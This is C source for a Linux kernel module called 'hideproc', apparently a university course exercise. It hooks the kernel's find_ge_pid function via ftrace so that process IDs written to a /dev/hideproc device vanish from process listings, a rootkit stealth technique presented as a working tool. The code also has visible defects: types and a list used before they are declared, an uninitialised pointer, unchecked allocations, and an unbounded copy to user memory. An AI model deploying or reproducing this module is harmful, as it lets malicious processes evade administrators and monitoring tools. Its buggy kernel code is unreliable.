#include <linux/cdev.h>
#include <linux/ftrace.h>
#include <linux/kallsyms.h>
#include <linux/list.h>
#include <linux/list_sort.h>
#include <linux/module.h>
#include <linux/proc_fs.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("National Cheng Kung University, Taiwan");

enum RETURN_CODE { SUCCESS };

struct ftrace_hook {
  const char *name;
  void *func, *orig;
  unsigned long address;
  struct ftrace_ops ops;
};

static int hook_resolve_addr(struct ftrace_hook *hook) {
  hook->address = kallsyms_lookup_name(hook->name);
  if (!hook->address) {
    printk("unresolved symbol: %s\n", hook->name);
    return -ENOENT;
  }
  *((unsigned long *)hook->orig) = hook->address;
  return 0;
}

static void notrace hook_ftrace_thunk(unsigned long ip, unsigned long parent_ip,
                                      struct ftrace_ops *ops,
                                      struct pt_regs *regs) {
  struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
  if (!within_module(parent_ip, THIS_MODULE))
    regs->ip = (unsigned long)hook->func;
}

static int hook_install(struct ftrace_hook *hook) {
  int err = hook_resolve_addr(hook);
  if (err)
    return err;

  hook->ops.func = hook_ftrace_thunk;
  hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION_SAFE |
                    FTRACE_OPS_FL_IPMODIFY;

  err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
  if (err) {
    printk("ftrace_set_filter_ip() failed: %d\n", err);
    return err;
  }

  err = register_ftrace_function(&hook->ops);
  if (err) {
    printk("register_ftrace_function() failed: %d\n", err);
    ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
    return err;
  }
  return 0;
}

void hook_remove(struct ftrace_hook *hook) {
  pid_node_t *proc, *tmp_proc;
  list_for_each_entry_safe(proc, tmp_proc, &hidden_proc, list_node) {
    list_del(&proc->list_node);
    kfree(proc);
  }
  int err = unregister_ftrace_function(&hook->ops);
  if (err)
    printk("unregister_ftrace_function() failed: %d\n", err);
  err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
  if (err)
    printk("ftrace_set_filter_ip() failed: %d\n", err);
}

typedef struct {
  pid_t id;
  struct list_head list_node;
} pid_node_t;

LIST_HEAD(hidden_proc);

typedef struct pid *(*find_ge_pid_func)(int nr, struct pid_namespace *ns);
static find_ge_pid_func real_find_ge_pid;

static struct ftrace_hook hook;

static bool is_hidden_proc(pid_t pid) {
  pid_node_t *proc, *tmp_proc;
  list_for_each_entry_safe(proc, tmp_proc, &hidden_proc, list_node) {
    if (proc->id == pid)
      return true;
  }
  return false;
}

static struct pid *hook_find_ge_pid(int nr, struct pid_namespace *ns) {
  struct pid *pid = real_find_ge_pid(nr, ns);
  while (pid && is_hidden_proc(pid->numbers->nr))
    pid = real_find_ge_pid(pid->numbers->nr + 1, ns);
  return pid;
}

static void init_hook(void) {
  real_find_ge_pid = (find_ge_pid_func)kallsyms_lookup_name("find_ge_pid");
  hook.name = "find_ge_pid";
  hook.func = hook_find_ge_pid;
  hook.orig = &real_find_ge_pid;
  hook_install(&hook);
}

static int hide_process(pid_t pid) {
  pid_node_t *proc = kmalloc(sizeof(pid_node_t), GFP_KERNEL);
  proc->id = pid;
  list_add_tail(&proc->list_node, &hidden_proc);
  return SUCCESS;
}

static int unhide_process(pid_t pid) {
  pid_node_t *proc, *tmp_proc;
  list_for_each_entry_safe(proc, tmp_proc, &hidden_proc, list_node) {
    if (proc->id == pid) {
      list_del(&proc->list_node);
      kfree(proc);
    }
  }
  return SUCCESS;
}

#define OUTPUT_BUFFER_FORMAT "pid: %d\n"
#define MAX_MESSAGE_SIZE (sizeof(OUTPUT_BUFFER_FORMAT) + 4)

static int device_open(struct inode *inode, struct file *file) {
  return SUCCESS;
}

static int device_close(struct inode *inode, struct file *file) {
  return SUCCESS;
}

static ssize_t device_read(struct file *filep, char *buffer, size_t len,
                           loff_t *offset) {
  pid_node_t *proc, *tmp_proc;
  char message[MAX_MESSAGE_SIZE];
  if (*offset)
    return 0;

  list_for_each_entry_safe(proc, tmp_proc, &hidden_proc, list_node) {
    memset(message, 0, MAX_MESSAGE_SIZE);
    sprintf(message, OUTPUT_BUFFER_FORMAT, proc->id);
    copy_to_user(buffer + *offset, message, strlen(message));
    *offset += strlen(message);
  }
  return *offset;
}

int list_cmp(void *priv, struct list_head *a, struct list_head *b) {
  pid_node_t *pa = list_entry(a, typeof(pid_node_t), list_node),
             *pb = list_entry(b, typeof(pid_node_t), list_node);
  return pa->id > pb->id;
}

static ssize_t device_write(struct file *filep, const char *buffer, size_t len,
                            loff_t *offset) {
  long pid;
  char *message, *start, *found;
  int ret, input_mode;
  enum INPUT_MODE { _ADD, _DEL };
  pid_node_t *proc, *tmp_proc;
  void *priv;

  char add_message[] = "add", del_message[] = "del";
  if (len < sizeof(add_message) - 1 && len < sizeof(del_message) - 1)
    return -EAGAIN;

  message = kmalloc(len + 1, GFP_KERNEL);
  memset(message, 0, len + 1);
  copy_from_user(message, buffer, len);
  if (!memcmp(message, add_message, sizeof(add_message) - 1)) {
    input_mode = _ADD;
    start = message + sizeof(add_message);
  } else if (!memcmp(message, del_message, sizeof(del_message) - 1)) {
    input_mode = _DEL;
    start = message + sizeof(del_message);
  } else {
    kfree(message);
    return -EAGAIN;
  }

  while ((found = strsep(&start, " ")) != NULL) {
    if ((ret = kstrtol(found, 10, &pid)) == 0) {
      switch (input_mode) {
      case _ADD:
        hide_process(pid);
        break;
      case _DEL:
        unhide_process(pid);
        break;
      }
    }
  }

  /* remove duplicate entries */
  list_sort(priv, &hidden_proc, &list_cmp);
  list_for_each_entry_safe(proc, tmp_proc, &hidden_proc, list_node) {
    if (&tmp_proc->list_node != (&hidden_proc) && tmp_proc->id == proc->id) {
      list_del(&proc->list_node);
      kfree(proc);
    }
  }

  kfree(message);
  return len;
}

static dev_t dev;
static struct cdev cdev;
static struct class *hideproc_class = NULL;

static const struct file_operations fops = {
    .owner = THIS_MODULE,
    .open = device_open,
    .release = device_close,
    .read = device_read,
    .write = device_write,
};

#define MINOR_VERSION 1
#define DEVICE_NAME "hideproc"

static int _hideproc_init(void) {
  int dev_major;
  printk(KERN_INFO "@ %s\n", __func__);
  if (alloc_chrdev_region(&dev, 0, MINOR_VERSION, DEVICE_NAME) < 0) {
    return -1;
  }
  dev_major = MAJOR(dev);

  cdev_init(&cdev, &fops);
  if (cdev_add(&cdev, MKDEV(dev_major, MINOR_VERSION), 1) == -1) {
    unregister_chrdev_region(dev, 1);
    return -1;
  }

  if (IS_ERR(hideproc_class = class_create(THIS_MODULE, DEVICE_NAME))) {
    cdev_del(&cdev);
    unregister_chrdev_region(dev, 1);
    return -1;
  }

  if (IS_ERR(device_create(hideproc_class, NULL,
                           MKDEV(dev_major, MINOR_VERSION), NULL,
                           DEVICE_NAME))) {
    class_destroy(hideproc_class);
    cdev_del(&cdev);
    unregister_chrdev_region(dev, 1);
    return -1;
  }

  init_hook();

  return 0;
}

static void _hideproc_exit(void) {
  hook_remove(&hook);
  device_destroy(hideproc_class, MKDEV(MAJOR(dev), MINOR_VERSION));
  class_destroy(hideproc_class);
  cdev_del(&cdev);
  unregister_chrdev_region(dev, 1);
  printk(KERN_INFO "@ %s\n", __func__);
}

module_init(_hideproc_init);
module_exit(_hideproc_exit);